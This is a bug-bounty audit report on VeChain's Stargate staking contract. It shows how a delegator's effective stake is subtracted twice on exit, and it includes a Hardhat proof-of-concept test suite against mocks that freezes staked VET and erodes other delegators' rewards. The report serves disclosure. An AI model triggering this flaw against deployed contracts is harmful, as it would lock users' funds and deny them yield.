# 60575 sc high double subtraction of delegator effective stake on exit can freeze vet and break reward distribution

**Submitted on Nov 24th 2025 at 07:12:15 UTC by @unineko for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60575
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Contract fails to deliver promised returns, but doesn't lose value
  * Permanent freezing of unclaimed yield

## Description

### Brief/Intro

When a delegator requests to exit and later unstakes after the validator has exited, Stargate decreases that delegator's effective stake twice for the same period range. The first decrease happens in `requestDelegationExit`, and a second decrease happens in `unstake` (and similarly in some re-delegation flows), without checking whether an exit was already requested. In the single-delegator case this can cause an underflow and revert, permanently blocking `unstake` and freezing the staked VET. In the multi-delegator case it silently double-subtracts the exiting delegator's stake from the per-period totals, causing remaining delegators to receive no rewards for those periods. If no upgrade or manual rescue mechanism is available, this effectively results in a permanent freezing of the user's staked VET for affected validators.

***

## Vulnerability Details

### 1. One-Time Decrease on requestDelegationExit

When a user requests to exit an active delegation, Stargate decreases that token's effective stake starting from a future period so that it stops participating in rewards:

```solidity
// Stargate.sol: Line 586, simplified
function requestDelegationExit(uint256 _tokenId) external {
    // ...

    // completedPeriods is the last fully completed period
    // The implementation decreases effective stake from completedPeriods + 2 onward
    _updatePeriodEffectiveStake(
        $,
        delegation.validator,
        _tokenId,
        completedPeriods + 2,
        false  // decrease
    );

    // ... mark endPeriod, status, etc.
}
```

**Conceptually:**

* Before the call, `delegatorsEffectiveStake[validator][period]` includes this delegator's effective stake
* `requestDelegationExit` calls `_updatePeriodEffectiveStake` with `_isIncrease = false`, subtracting that stake from the delegator totals used to compute rewards
* At this point, the accounting correctly reflects that the delegator will not earn rewards from that future period onward

***

### 2. Second Decrease on Unstake After Validator Exit

Later, once the validator has exited and the user calls unstake, Stargate's unstake implementation performs another decrease of the same delegator's effective stake based only on validator status and delegation status, without checking whether `requestDelegationExit` already ran:

```solidity
// Stargate.sol: Lines 266-288, simplified
function unstake(uint256 _tokenId) external {
    // ... load delegation, validator, period state ...

    (, , , , uint8 currentValidatorStatus, ) =
        $.protocolStakerContract.getValidation(delegation.validator);

    // If validator is EXITED or delegation is still PENDING,
    // Stargate tries to "clean up" effective stake again
    if (
        currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
        delegation.status == DelegationStatus.PENDING
    ) {
        _updatePeriodEffectiveStake(
            $,
            delegation.validator,
            _tokenId,
            oldCompletedPeriods + 2,
            false  // decrease again
        );
    }

    // ... proceed to burn NFT and refund VET ...
}
```

**Key issues:**

* The condition uses only `currentValidatorStatus` and `delegation.status`
* It does not check whether an exit was already requested (for example via `endPeriod != type(uint32).max` or a dedicated `hasRequestedExit` flag)
* In the common flow where the user first calls `requestDelegationExit` and later unstake after the validator has exited, the same token's effective stake is decreased twice for overlapping or identical period ranges

***

### 3. Decrease Implementation Can Underflow

The decrease logic is centralized in `_updatePeriodEffectiveStake`:

```solidity
// Stargate.sol: Lines 1026-1046, simplified
function _updatePeriodEffectiveStake(
    StargateStorage storage $,
    address _validator,
    uint256 _tokenId,
    uint32 _period,
    bool _isIncrease
) private {
    uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);
    uint256 currentValue = $.delegatorsEffectiveStake[_validator].upperLookup(_period);

    uint256 updatedValue = _isIncrease
        ? currentValue + effectiveStake
        : currentValue - effectiveStake;  // may underflow

    $.delegatorsEffectiveStake[_validator].insert(_period, updatedValue);
}
```

Solidity 0.8.x reverts on underflow. Therefore:

* If `currentValue` already excludes this delegator's stake (because it was previously subtracted in `requestDelegationExit`), and
* `currentValue < effectiveStake`,
* then `currentValue - effectiveStake` underflows and the entire transaction reverts

***

### 4. Concrete Scenarios

#### Case A: Single Delegator on a Validator (Underflow and Freeze)

1. Validator V has a single delegator A with effective stake 100
2. For the future period `P = completedPeriods + 2`, `delegatorsEffectiveStake[V][P] = 100`
3. A calls `requestDelegationExit(tokenId)`:
   * `_updatePeriodEffectiveStake` is invoked with `_isIncrease = false`
   * `currentValue = 100`, `effectiveStake = 100`
   * New value = `100 - 100 = 0`
   * Stored value: `delegatorsEffectiveStake[V][P] = 0`
4. The validator eventually exits and its status becomes `VALIDATOR_STATUS_EXITED`
5. A calls `unstake(tokenId)`:
   * The if condition in unstake is satisfied (`currentValidatorStatus == EXITED`)
   * `_updatePeriodEffectiveStake` is called again for the same `_validator` and period range
   * `currentValue = delegatorsEffectiveStake[V][P] = 0`, `effectiveStake = 100`
   * New value attempts to compute `0 - 100`, which underflows and reverts

**Result:**

* `unstake` reverts before the VET refund
* There is no alternative unstake path that skips this second decrease
* A's staked VET is effectively frozen until a contract upgrade or manual intervention
* No special attacker privileges are required; this is triggered by the normal sequence "request exit → validator exit → unstake"

#### Case B: Multiple Delegators (Silent Reward Mis-Accounting)

Now assume three delegators on V:

* A with effective stake 100 (eventually exits)
* B with effective stake 50
* C with effective stake 50
* Total effective stake prior to A's exit is 200

1. A calls `requestDelegationExit`:
   * `delegatorsEffectiveStake[V][P]` goes from 200 to 100 (only B + C)
   * This is correct so far
2. Later, when V is EXITED, A calls `unstake`:
   * `currentValue` at `_updatePeriodEffectiveStake` time is 100 (the stake of B + C)
   * `effectiveStake` for A is still 100
   * New value becomes `100 - 100 = 0`
   * `delegatorsEffectiveStake[V][P]` is now 0

From this point onward, reward calculation for period P that relies on `delegatorsEffectiveStake` will treat the total effective stake as 0, even though B and C are still active and should have a combined stake of 100. Depending on how division-by-zero or zero-total cases are handled, this can:

* Completely remove B and C from future reward allocations for that period range, or
* Force a special case that results in no rewards distributed to delegators

Effectively, the protocol underpays or never pays promised rewards to remaining delegators for those periods, even though no funds are directly stolen.

***

## Impact Details

### Chosen Impacts

#### 1. Permanent Freezing of Funds

In the single-delegator scenario (Case A):

* The delegator follows the intended flow: delegate, request exit, wait for validator exit, then call unstake
* Because the effective stake has already been subtracted once, the second subtraction in unstake underflows and reverts
* The transaction fails before any VET is refunded and there is no alternative unstake path that avoids this logic
* If no upgrade or administrative workaround is available, this amounts to effectively permanent freezing of the delegator's staked VET. Every subsequent attempt to unstake under the same conditions will revert for the same reason

#### 2. Contract Fails to Deliver Promised Returns / Permanent Freezing of Unclaimed Yield

In the multi-delegator scenario (Case B):

* The exiting delegator's effective stake is subtracted twice from the validator's per-period delegator totals
* The second subtraction removes not only the exiting delegator's contribution but also the remaining delegators' contribution
* As a result, the protocol's accounting may consider the total effective stake for that period to be zero, even though other delegators are still active

Depending on the exact reward calculation, this can:

* Cause remaining delegators to receive no yield for those periods
* Permanently lose their claim to rewards that conceptually should be theirs (unclaimed yield is effectively frozen or never generated at the accounting level)

This is not a direct theft of principal, but it is a failure to deliver promised rewards to honest delegators and a permanent loss of expected yield.

### Attacker Model and Likelihood

* No special role or privileged access is required
* The issue is triggered by normal usage patterns:
  1. Delegator requests exit
  2. Validator later exits
  3. Delegator calls unstake
* Single-delegator validators or small-validator sets make the underflow scenario especially likely
* For larger validator sets, mis-accounting of rewards for remaining delegators is possible without causing a revert, degrading reward correctness over time

***

## References

### Contract References

#### contracts/Stargate.sol

* `requestDelegationExit(uint256 _tokenId)` (Line 586) - first decrease of effective stake via `_updatePeriodEffectiveStake(..., false)` using `completedPeriods + 2`
* `unstake(uint256 _tokenId)` (Lines 266-288) - second decrease of effective stake when `currentValidatorStatus == EXITED` or `delegation.status == PENDING`, without checking whether exit was already requested
* `_updatePeriodEffectiveStake(...)` (Lines 1026-1046) - performs `currentValue - effectiveStake` on `delegatorsEffectiveStake` and relies on Solidity 0.8 underflow checks, which revert on negative results

These functions together implement a state machine where a delegator's effective stake can be decreased twice for the same period range, leading to either a reverting unstake (funds freeze) or incorrect reward totals (permanent loss of yield) depending on validator composition.

## Proof of Concept

npx hardhat test --network hardhat test/unit/PoC/001\_C1\_PoC.test.ts --show-stack-traces

```solidity
/**
 * VEC-STG-001: Double Subtraction of Delegator Effective Stake PoC
 *
 * @description
 * Demonstrates double subtraction vulnerability where `delegatorsEffectiveStake` is
 * decremented twice when: (1) requestDelegationExit(), (2) unstake() after validator exit
 *
 * @impact
 * - Case A: Permanent VET freeze (underflow revert)
 * - Case B: Reward loss for remaining delegators (silent mis-accounting)
 *
 * @severity CRITICAL
 */

import { expect } from "chai";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { setBalance, setCode } from "@nomicfoundation/hardhat-network-helpers";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { getOrDeployContracts } from "../../helpers/deploy";

import type { Stargate, ProtocolStakerMock, StargateNFT, MyERC20 } from "../../../typechain-types";
import { ProtocolStakerMock__factory, MyERC20__factory } from "../../../typechain-types";

// Constants
const VALIDATOR_STATUS_ACTIVE = 2;
const VALIDATOR_STATUS_EXITED = 3;
const DELEGATION_STATUS_ACTIVE = 2;
const DELEGATION_STATUS_EXITED = 3;

describe("VEC-STG-001: Double Subtraction Vulnerability", () => {
    let stargateContract: Stargate;
    let protocolStakerMock: ProtocolStakerMock;
    let stargateNFTContract: StargateNFT;
    let deployer: HardhatEthersSigner;

    // Helper: Setup user with balance and stake
    async function setupUserStake(
        signer: HardhatEthersSigner,
        validatorAddr: string
    ): Promise<{ tokenId: bigint; delegationId: bigint }> {
        await setBalance(signer.address, ethers.parseEther("50000000"));

        // Stake
        const stakeTx = await stargateContract
            .connect(signer)
            .stake(1, { value: ethers.parseEther("1") });
        await stakeTx.wait();
        const tokenId = await stargateNFTContract.getCurrentTokenId();

        // Delegate
        const delegateTx = await stargateContract.connect(signer).delegate(tokenId, validatorAddr);
        await delegateTx.wait();
        const delegationDetails = await stargateContract.getDelegationDetails(tokenId);

        return { tokenId, delegationId: delegationDetails.delegationId };
    }

    // Helper: Setup validator
    async function setupValidator(validatorAddr: string): Promise<void> {
        await protocolStakerMock.addValidation(validatorAddr, 120);
        await protocolStakerMock.helper__setValidatorStatus(validatorAddr, VALIDATOR_STATUS_ACTIVE);
    }

    before(async () => {
        console.log("\n========================================");
        console.log("VEC-STG-001: Double Subtraction PoC");
        console.log("========================================\n");

        [deployer] = await ethers.getSigners();
        await setBalance(deployer.address, ethers.parseEther("50000000"));

        // Deploy ProtocolStakerMock
        protocolStakerMock = await new ProtocolStakerMock__factory(deployer).deploy();
        await protocolStakerMock.waitForDeployment();

        // Deploy contracts
        const config = createLocalConfig();
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.TOKEN_LEVELS = [
            {
                level: {
                    id: 1,
                    name: "Basic Node",
                    isX: false,
                    vetAmountRequiredToStake: ethers.parseEther("1"),
                    scaledRewardFactor: 150, // 1.5x
                    maturityBlocks: 0,
                },
                cap: 1000,
                circulatingSupply: 0,
            },
        ];
        config.STARGATE_NFT_BOOST_LEVEL_IDS = [];
        config.STARGATE_NFT_BOOST_PRICES_PER_BLOCK = [];

        const { stargateContract: deployedStargate, stargateNFTContract: deployedStargateNFT } =
            await getOrDeployContracts({ forceDeploy: true, config });

        stargateContract = deployedStargate;
        stargateNFTContract = deployedStargateNFT;

        await protocolStakerMock.helper__setStargate(await stargateContract.getAddress());

        // Setup VTHO mock using MyERC20
        const VTHO_ADDRESS = "0x0000000000000000000000000000456E65726779";
        const myERC20 = await new MyERC20__factory(deployer).deploy(
            deployer.address,
            deployer.address
        );
        await myERC20.waitForDeployment();

        // Copy MyERC20 bytecode to VTHO address
        const myERC20Bytecode = await ethers.provider.getCode(await myERC20.getAddress());
        await setCode(VTHO_ADDRESS, myERC20Bytecode);

        // Mint VTHO tokens to Stargate contract for reward distribution
        const vthoContract = MyERC20__factory.connect(VTHO_ADDRESS, deployer);
        await vthoContract.mint(
            await stargateContract.getAddress(),
            ethers.parseEther("1000000")
        );

        console.log("  [OK] Contracts deployed");
        console.log("  [OK] Level 1: 1 VET, 1.5x multiplier, 0 maturity");
        console.log("  [OK] VTHO mock deployed and funded\n");
    });

    describe("Case A: Single Delegator - Permanent Fund Freeze", () => {
        let user: HardhatEthersSigner;
        let validatorAddress: string;
        let tokenId: bigint;

        it("should demonstrate underflow causing permanent VET freeze with Panic(0x11)", async () => {
            console.log("\n--- Case A: Single Delegator Scenario ---\n");

            // Setup
            [, user] = await ethers.getSigners();
            validatorAddress = deployer.address;
            await setupValidator(validatorAddress);

            const result = await setupUserStake(user, validatorAddress);
            tokenId = result.tokenId;

            console.log(`1. User staked & delegated: tokenId=${tokenId}`);

            // Make delegation ACTIVE
            await protocolStakerMock.helper__setValidationCompletedPeriods(validatorAddress, 1);
            const status1 = await stargateContract.getDelegationStatus(tokenId);
            expect(status1).to.equal(BigInt(DELEGATION_STATUS_ACTIVE));
            console.log(`2. Delegation ACTIVE (completedPeriods=1)`);

            // Verify effective stake before exit
            const effectiveBefore = await stargateContract.getDelegatorsEffectiveStake(
                validatorAddress,
                2
            );
            expect(effectiveBefore).to.equal(ethers.parseEther("1.5"));
            console.log(`3. Effective stake (period 2): 1.5 VET`);

            // === ATTACK PHASE ===
            console.log("\n--- Attack Phase ---");

            // 1ST SUBTRACTION: requestDelegationExit
            await stargateContract.connect(user).requestDelegationExit(tokenId);
            const effectiveAfterExit = await stargateContract.getDelegatorsEffectiveStake(
                validatorAddress,
                3
            );
            expect(effectiveAfterExit).to.equal(0n);
            console.log(
                `4. [1ST SUBTRACTION] requestDelegationExit() → period 3: 1.5 → 0 VET`
            );

            // Advance period
            await protocolStakerMock.helper__setValidationCompletedPeriods(validatorAddress, 2);
            console.log(`5. Advanced to completedPeriods=2 (current period=3)`);

            // Validator exits
            await protocolStakerMock.helper__setValidatorStatus(
                validatorAddress,
                VALIDATOR_STATUS_EXITED
            );
            console.log(`6. Validator status: EXITED`);

            const status2 = await stargateContract.getDelegationStatus(tokenId);
            expect(status2).to.equal(BigInt(DELEGATION_STATUS_EXITED));

            // Verify period 4 also returns 0 (upperLookup)
            const effectivePeriod4 = await stargateContract.getDelegatorsEffectiveStake(
                validatorAddress,
                4
            );
            expect(effectivePeriod4).to.equal(0n);
            console.log(`7. Period 4 effective stake: 0 VET (upperLookup from period 3)`);

            // 2ND SUBTRACTION: unstake → UNDERFLOW
            console.log(`\n8. [2ND SUBTRACTION] unstake() → Attempting 0 - 1.5...`);
            await expect(stargateContract.connect(user).unstake(tokenId)).to.be.revertedWithPanic(
                0x11
            );

            console.log(`\nVULNERABILITY CONFIRMED:`);
            console.log(`   - unstake() reverted with Panic(0x11) (Arithmetic underflow)`);
            console.log(`   - User's 1 VET is FROZEN in ProtocolStaker`);
            console.log(`   - No recovery mechanism without contract upgrade`);

            // Verify funds still frozen
            const protocolBalance = await ethers.provider.getBalance(
                await protocolStakerMock.getAddress()
            );
            expect(protocolBalance).to.equal(ethers.parseEther("1"));
            console.log(`   - ProtocolStaker balance: 1 VET (frozen)\n`);
        });

        it("should verify control: normal unstake works when validator stays ACTIVE", async () => {
            console.log("\n--- Control Test: Normal Unstake ---\n");

            // Setup new user and validator
            const [, , controlUser] = await ethers.getSigners();
            const controlValidator = controlUser.address;
            await setupValidator(controlValidator);

            const { tokenId: controlTokenId } = await setupUserStake(
                controlUser,
                controlValidator
            );
            console.log(`1. Control user staked & delegated: tokenId=${controlTokenId}`);

            // Make delegation ACTIVE
            await protocolStakerMock.helper__setValidationCompletedPeriods(controlValidator, 1);
            console.log(`2. Delegation ACTIVE`);

            // Request exit
            await stargateContract.connect(controlUser).requestDelegationExit(controlTokenId);
            console.log(`3. User requested exit (1st subtraction)`);

            // Advance period (delegation becomes EXITED)
            await protocolStakerMock.helper__setValidationCompletedPeriods(controlValidator, 2);
            const status = await stargateContract.getDelegationStatus(controlTokenId);
            expect(status).to.equal(BigInt(DELEGATION_STATUS_EXITED));
            console.log(`4. Delegation EXITED`);

            // KEY DIFFERENCE: Validator remains ACTIVE
            const [, , , , validatorStatus] =
                await protocolStakerMock.getValidation(controlValidator);
            expect(validatorStatus).to.equal(VALIDATOR_STATUS_ACTIVE);
            console.log(`5. Validator remains ACTIVE (does NOT exit)`);

            // Unstake should SUCCEED
            const unstakeTx = await stargateContract.connect(controlUser).unstake(controlTokenId);
            await unstakeTx.wait();
            console.log(`\nunstake() SUCCEEDED (no double subtraction)`);
            console.log(`   - Only 1 subtraction occurred (requestDelegationExit)`);
            console.log(`   - Validator ACTIVE → Lines 266-283 block skipped\n`);
        });
    });

    describe("Case B: Multiple Delegators - Reward Mis-Accounting", () => {
        it("should demonstrate silent double subtraction with 3 delegators (50% loss)", async () => {
            console.log("\n--- Case B: Multiple Delegators Scenario ---\n");

            // Setup validator
            const [, , , validatorB] = await ethers.getSigners();
            await setupValidator(validatorB.address);
            console.log(`1. Validator B setup: ${validatorB.address}`);

            // Setup 3 delegators (A will exit, B and C remain)
            const [, , , , userA, userB, userC] = await ethers.getSigners();

            const { tokenId: tokenIdA } = await setupUserStake(userA, validatorB.address);
            const { tokenId: tokenIdB } = await setupUserStake(userB, validatorB.address);
            const { tokenId: tokenIdC } = await setupUserStake(userC, validatorB.address);

            console.log(`2. Three users staked & delegated:`);
            console.log(`   - User A: tokenId=${tokenIdA}`);
            console.log(`   - User B: tokenId=${tokenIdB}`);
            console.log(`   - User C: tokenId=${tokenIdC}`);

            // Make delegations ACTIVE
            await protocolStakerMock.helper__setValidationCompletedPeriods(validatorB.address, 1);
            console.log(`3. All delegations ACTIVE`);

            // Verify total effective stake = 4.5 (1.5 × 3)
            const effectiveBefore = await stargateContract.getDelegatorsEffectiveStake(
                validatorB.address,
                2
            );
            expect(effectiveBefore).to.equal(ethers.parseEther("4.5"));
            console.log(`4. Total effective stake (period 2): 4.5 VET (1.5 × 3)`);

            // === ATTACK PHASE ===
            console.log("\n--- Attack Phase ---");

            // User A requests exit (1ST SUBTRACTION)
            await stargateContract.connect(userA).requestDelegationExit(tokenIdA);
            const effectiveAfterExit = await stargateContract.getDelegatorsEffectiveStake(
                validatorB.address,
                3
            );
            expect(effectiveAfterExit).to.equal(ethers.parseEther("3.0"));
            console.log(
                `5. [1ST SUBTRACTION] User A exits → period 3: 4.5 → 3.0 VET (correct)`
            );

            // Advance period + Validator exits
            await protocolStakerMock.helper__setValidationCompletedPeriods(validatorB.address, 2);
            await protocolStakerMock.helper__setValidatorStatus(
                validatorB.address,
                VALIDATOR_STATUS_EXITED
            );
            console.log(`6. Period advanced, Validator EXITED`);

            // User A unstakes (2ND SUBTRACTION - SILENT!)
            await stargateContract.connect(userA).unstake(tokenIdA);
            console.log(`7. [2ND SUBTRACTION] User A unstake() → NO REVERT`);

            // CRITICAL: Check effective stake after double subtraction
            const effectiveAfterUnstake = await stargateContract.getDelegatorsEffectiveStake(
                validatorB.address,
                4
            );

            console.log(`\nVULNERABILITY CONFIRMED:`);
            console.log(`   Expected effective stake (B + C): 3.0 VET`);
            console.log(
                `   Actual effective stake: ${ethers.formatEther(effectiveAfterUnstake)} VET`
            );

            // Should be 1.5 (double subtraction: 3.0 - 1.5)
            expect(effectiveAfterUnstake).to.equal(ethers.parseEther("1.5"));

            console.log(`\n   IMPACT:`);
            console.log(`   - User A's stake subtracted TWICE (4.5 → 3.0 → 1.5)`);
            console.log(`   - Users B & C lose 50% of entitled rewards`);
            console.log(
                `   - Protocol accounting: 1.5 VET instead of 3.0 VET for reward distribution`
            );
            console.log(`   - Permanent loss of unclaimed yield\n`);
        });

        it("should demonstrate silent double subtraction with 2 delegators (100% loss)", async () => {
            console.log("\n--- Case B-2: Two Delegators Scenario (Worst Case) ---\n");

            // Setup validator
            const [, , , , , , , validatorC] = await ethers.getSigners();
            await setupValidator(validatorC.address);
            console.log(`1. Validator C setup: ${validatorC.address}`);

            // Setup 2 delegators (A will exit, B remains)
            const [, , , , , , , , userA2, userB2] = await ethers.getSigners();

            const { tokenId: tokenIdA2 } = await setupUserStake(userA2, validatorC.address);
            const { tokenId: tokenIdB2 } = await setupUserStake(userB2, validatorC.address);

            console.log(`2. Two users staked & delegated:`);
            console.log(`   - User A: tokenId=${tokenIdA2}`);
            console.log(`   - User B: tokenId=${tokenIdB2}`);

            // Make delegations ACTIVE
            await protocolStakerMock.helper__setValidationCompletedPeriods(validatorC.address, 1);
            console.log(`3. All delegations ACTIVE`);

            // Verify total effective stake = 3.0 (1.5 × 2)
            const effectiveBefore = await stargateContract.getDelegatorsEffectiveStake(
                validatorC.address,
                2
            );
            expect(effectiveBefore).to.equal(ethers.parseEther("3.0"));
            console.log(`4. Total effective stake (period 2): 3.0 VET (1.5 × 2)`);

            // === ATTACK PHASE ===
            console.log("\n--- Attack Phase ---");

            // User A requests exit (1ST SUBTRACTION)
            await stargateContract.connect(userA2).requestDelegationExit(tokenIdA2);
            const effectiveAfterExit = await stargateContract.getDelegatorsEffectiveStake(
                validatorC.address,
                3
            );
            expect(effectiveAfterExit).to.equal(ethers.parseEther("1.5"));
            console.log(
                `5. [1ST SUBTRACTION] User A exits → period 3: 3.0 → 1.5 VET (correct)`
            );

            // Advance period + Validator exits
            await protocolStakerMock.helper__setValidationCompletedPeriods(validatorC.address, 2);
            await protocolStakerMock.helper__setValidatorStatus(
                validatorC.address,
                VALIDATOR_STATUS_EXITED
            );
            console.log(`6. Period advanced, Validator EXITED`);

            // User A unstakes (2ND SUBTRACTION - SILENT!)
            await stargateContract.connect(userA2).unstake(tokenIdA2);
            console.log(`7. [2ND SUBTRACTION] User A unstake() → NO REVERT`);

            // CRITICAL: Check effective stake after double subtraction
            const effectiveAfterUnstake = await stargateContract.getDelegatorsEffectiveStake(
                validatorC.address,
                4
            );

            console.log(`\nVULNERABILITY CONFIRMED (WORST CASE):`);
            console.log(`   Expected effective stake (B only): 1.5 VET`);
            console.log(
                `   Actual effective stake: ${ethers.formatEther(effectiveAfterUnstake)} VET`
            );

            // Should be 0 (double subtraction: 1.5 - 1.5 = 0)
            expect(effectiveAfterUnstake).to.equal(0n);

            console.log(`\n   CRITICAL IMPACT:`);
            console.log(`   - User A's stake subtracted TWICE (3.0 → 1.5 → 0)`);
            console.log(`   - User B receives NO REWARDS (100% loss)`);
            console.log(
                `   - Protocol accounting: 0 VET despite B having 1.5 VET staked`
            );
            console.log(`   - Division-by-zero risk in reward calculation`);
            console.log(`   - Complete loss of all delegator rewards for affected periods\n`);
        });
    });
});
 
```
